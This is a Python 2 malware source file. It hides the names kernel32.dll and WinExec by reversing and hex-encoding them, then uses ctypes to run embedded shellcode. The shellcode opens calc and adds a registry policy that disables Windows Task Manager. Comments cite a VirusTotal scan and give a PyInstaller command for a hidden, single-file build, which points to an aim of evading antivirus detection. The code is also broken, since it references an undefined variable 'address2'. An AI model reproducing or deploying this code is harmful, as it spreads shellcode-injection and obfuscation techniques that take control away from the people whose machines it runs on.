from ctypes import *
from sys import exit as bye
from re import findall

#Assembly & Python
#https://www.virustotal.com/tr/file/fec23c51a1e475cd91cde1edabb68f02f8483a1f092f1bba370fddb9494cdc3a/analysis/1438718479/
#python pyinstaller.py --noconsole --onefile X0X0.py


"""
 ___            _                             ___ 
| _ ) ___ _ __ | |__  ___ _ _ _ __  __ _ _ _ / __|
| _ \/ _ \ '  \| '_ \/ -_) '_| '  \/ _` | ' \\__ \
|___/\___/_|_|_|_.__/\___|_| |_|_|_\__,_|_||_|___/
 							 _____               
							|_   _|__ __ _ _ __  
							  | |/ -_) _` | '  \ 
							  |_|\___\__,_|_|_|_|

						Bomberman > B3mB4m < T-Rex
"""


class B3mB4m(object):
	def __init__(self):
		self.start()

	def start(self):	
		try:
			kernel32 = windll.kernel32
			handle = kernel32.GetModuleHandleA(("c6c646e22333c656e62756b6"[::-1]).decode("hex"))
			address = kernel32.GetProcAddress(handle, ("36568754e69675"[::-1]).decode("hex"))
		except:
			bye()	
		self.fixmesempai = findall('..?', hex(address).split("0x")[1])
		self.fixmesempai2 = findall('..?', hex(address2).split("0x")[1])
		self.first()


	def first(self):
		mybytemyworld = "eb1f5931c05051b8"
		pushstack = "%s%s%s%s" % (self.fixmesempai[::-1][0],self.fixmesempai[::-1][1],self.fixmesempai[::-1][2],self.fixmesempai[::-1][3])
	 	mybytemyworld += pushstack
	 	mybytemyworld += "ffd031c0506863616c6389e15051b8"
	 	mybytemyworld += pushstack
	 	mybytemyworld += "ffd0e8dcffffff5245472061646420"
	 	mybytemyworld += "484b43555c536f6674776172655c4d"
	 	mybytemyworld += "6963726f736f66745c57696e646f777" #Some parts encoded you cant reverse,At least I think that..
	 	mybytemyworld += "35c43757272656e7456657273696f6e"
	 	mybytemyworld += "5c506f6c69636965735c53797374656"
	 	mybytemyworld += "d202f762044697361626c655461736b"
	 	mybytemyworld += "4d6772202f74205245475f44574f5244202f642031202f66"

		self.execute( str(bytearray(mybytemyworld.decode("hex"))))	


	def execute(self, doit):	
		shellcode = c_char_p(doit)
		function = cast(shellcode, CFUNCTYPE(None))
		function()

B3mB4m()
